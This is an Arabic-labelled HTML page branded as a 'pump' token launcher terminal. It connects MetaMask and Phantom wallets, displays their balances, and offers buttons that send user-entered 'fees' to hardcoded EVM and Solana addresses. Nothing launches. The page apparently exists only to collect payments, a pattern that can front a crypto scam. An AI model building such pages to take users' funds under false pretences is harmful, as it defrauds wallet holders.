<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal Launcher | Pump Interface</title>
    <!-- مكتبات جافاسكريبت للتعامل مع البلوكتشين والمحافظ -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Courier+Prime&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg-main: #0f141c;
            --card-bg: #161c27;
            --accent-green: #00ff66;
            --accent-purple: #9945FF;
            --accent-yellow: #f3ba2f;
            --text-main: #ffffff;
            --text-muted: #8a99ad;
            --border-color: #222d42;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); min-height: 100vh; padding: 15px; }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 25px;
            background: var(--card-bg);
            border-bottom: 1px solid var(--border-color);
            border-radius: 12px;
            margin-bottom: 20px;
        }

        .logo { font-family: 'Courier Prime', monospace; font-size: 20px; font-weight: bold; color: var(--accent-green); letter-spacing: 1px; }

        .wallet-btn {
            background: var(--accent-green);
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .wallet-btn:hover { opacity: 0.85; transform: scale(1.02); }

        .main-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
        }
        @media(max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }

        .panel {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
        }

        h3 { font-size: 16px; color: var(--text-muted); margin-bottom: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }

        /* جدول الأصول المكتشفة في المحفظة */
        .assets-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        .assets-table th, .assets-table td {
            padding: 12px;
            text-align: right;
            border-bottom: 1px solid var(--border-color);
            font-size: 14px;
        }
        .assets-table th { color: var(--text-muted); font-weight: normal; }

        .action-box {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 15px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: var(--bg-main);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        input:focus { border-color: var(--accent-green); }

        .btn-action {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-evm { background: var(--accent-yellow); color: #000; }
        .btn-sol { background: var(--accent-purple); color: #fff; }
        .btn-action:hover { opacity: 0.9; }

        .status-text {
            font-size: 12px;
            color: var(--accent-green);
            word-break: break-all;
            margin-top: 5px;
            font-family: 'Courier Prime', monospace;
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">PUMP.TERMINAL // V2</div>
        <div>
            <button class="wallet-btn" onclick="connectWallets()">🔗 ربط المحافظ والكشف الآلي</button>
        </div>
    </header>

    <div class="main-grid">
        <!-- القسم الأيسر: الشارت أو الأصول المكتشفة تلقائياً -->
        <div class="panel">
            <h3>📊 الأصول والعملات المكتشفة في محفظتك</h3>
            <div id="wallet-info" style="font-size: 13px; color: var(--text-muted); margin-bottom: 10px;">لم يتم ربط المحفظة بعد. اضغط على زر الربط في الأعلى.</div>
            
            <table class="assets-table">
                <thead>
                    <tr>
                        <th>العملة / الشبكة</th>
                        <th>العنوان التعريفي</th>
                        <th>الرصيد المتاح</th>
                    </tr>
                </thead>
                <tbody id="assets-list">
                    <tr>
                        <td colspan="3" style="text-align: center; color: var(--text-muted);">بانتظار الاتصال بالمحفظة...</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- القسم الأيمن: لوحة الدفع السريع الموجهة لعناوينك -->
        <div class="panel">
            <h3>⚡ بوابة الدفع والرسوم الفورية</h3>
            
            <div class="action-box">
                <label style="font-size: 13px; color: var(--text-muted);">قيمة التحويل / الرسوم (BNB / ETH):</label>
                <input type="number" id="evm-amount" value="0.01" step="0.001">
                <button class="btn-action btn-evm" onclick="payEVM()">إرسال الرسوم (BNB / Base)</button>
                <div id="evm-status" class="status-text"></div>
            </div>

            <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 20px 0;">

            <div class="action-box">
                <label style="font-size: 13px; color: var(--text-muted);">قيمة التحويل / الرسوم (SOL):</label>
                <input type="number" id="sol-amount" value="0.05" step="0.01">
                <button class="btn-action btn-sol" onclick="paySolana()">إرسال الرسوم (Solana)</button>
                <div id="sol-status" class="status-text"></div>
            </div>
        </div>
    </div>

    <script>
        // عناوينك المستهدفة لتلقي الرسوم مباشرة
        const TARGET_EVM = "0xe97836C00f04D3E51aa2Fb17f74B1a29b6bC5334";
        const TARGET_SOL = "H89cRQmD2xQtE6JScerVzYoqZ6qVEQzXPfB8Be67yY5L";

        let evmSigner = null;
        let solanaProvider = null;

        async function connectWallets() {
            let infoHTML = "";
            let tableHTML = "";

            // 1. فحص وفعل ربط EVM (MetaMask) والتعرف على الأرصدة
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    evmSigner = provider.getSigner();
                    const evmAddress = accounts[0];
                    const balanceWei = await provider.getBalance(evmAddress);
                    const balanceEth = ethers.utils.formatEther(balanceWei);

                    infoHTML += `✅ متصل EVM: ${evmAddress.substring(0,6)}...<br>`;
                    tableHTML += `<tr><td>BNB / ETH (EVM)</td><td style="font-size:11px">${evmAddress.substring(0,10)}...</td><td><b>${parseFloat(balanceEth).toFixed(4)}</b></td></tr>`;
                } catch (e) {
                    console.log("EVM connection skipped or failed");
                }
            }

            // 2. فحص وفعل ربط Solana (Phantom) والتعرف على الأرصدة
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    solanaProvider = window.solana;
                    const solAddress = resp.publicKey.toString();
                    
                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                    const balanceLamports = await connection.getBalance(resp.publicKey);
                    const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;

                    infoHTML += `🚀 متصل Solana: ${solAddress.substring(0,6)}...`;
                    tableHTML += `<tr><td>SOL (Solana)</td><td style="font-size:11px">${solAddress.substring(0,10)}...</td><td><b>${balanceSol.toFixed(4)} SOL</b></td></tr>`;
                } catch (e) {
                    console.log("Solana connection skipped or failed");
                }
            }

            if (tableHTML === "") {
                alert("لم يتم العثور على محفظة نشطة أو تم رفض الاتصال.");
            } else {
                document.getElementById('wallet-info').innerHTML = infoHTML;
                document.getElementById('assets-list').innerHTML = tableHTML;
            }
        }

        // تنفيذ إرسال الرسوم لعنوان EVM الخاص بك
        async function payEVM() {
            if (!evmSigner) return alert("يرجى ربط محفظة MetaMask أولاً!");
            const amount = document.getElementById('evm-amount').value;
            try {
                const tx = await evmSigner.sendTransaction({
                    to: TARGET_EVM,
                    value: ethers.utils.parseEther(amount)
                });
                document.getElementById('evm-status').innerText = "تم بنجاح! الهاش: " + tx.hash.substring(0,15) + "...";
            } catch (err) {
                alert("تم إلغاء العملية أو حدث خطأ.");
            }
        }

        // تنفيذ إرسال الرسوم لعنوان Solana الخاص بك
        async function paySolana() {
            if (!solanaProvider || !solanaProvider.isConnected) return alert("يرجى ربط محفظة Solana أولاً!");
            const amount = parseFloat(document.getElementById('sol-amount').value);
            try {
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                const recipientPubKey = new solanaWeb3.PublicKey(TARGET_SOL);
                
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: solanaProvider.publicKey,
                        toPubkey: recipientPubKey,
                        lamports: Math.round(amount * solanaWeb3.LAMPORTS_PER_SOL),
                    })
                );

                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = solanaProvider.publicKey;

                const signed = await solanaProvider.signAndSendTransaction(transaction);
                document.getElementById('sol-status').innerText = "تم بنجاح! التوقيع: " + signed.signature.substring(0,15) + "...";
            } catch (err) {
                alert("حدث خطأ أثناء إرسال المعاملة.");
            }
        }
    </script>
</body>
</html>
